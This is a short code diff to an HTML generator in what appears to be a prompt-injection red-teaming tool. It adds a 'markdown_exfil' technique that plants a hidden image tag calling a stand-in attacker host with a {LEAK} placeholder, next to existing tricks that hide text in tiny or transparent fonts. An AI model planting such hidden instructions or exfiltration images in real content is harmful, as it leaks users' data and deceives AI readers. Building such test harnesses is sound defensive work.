@@ -25,6 +25,11 @@ def generate_html(attack_result: AttackResult, title: str, output_path: Path) ->
             f'<span style="color:#e0e0e0;font-size:4px;background:#f0f0f0;">'
             f"{attack_result.hidden_content}</span>"
         )
+    elif attack_result.technique == "markdown_exfil":
+        exfil_url = hints.get("exfil_url", "https://collector.attacker.invalid/collect?data={LEAK}")
+        hidden_css = (
+            f'<img src="{exfil_url}" alt="tracking-pixel" style="display:none;" />'
+        )
     elif hints.get("font_size_zero_text"):
         hidden_css = (
             f'<span style="font-size:0;color:transparent;">'
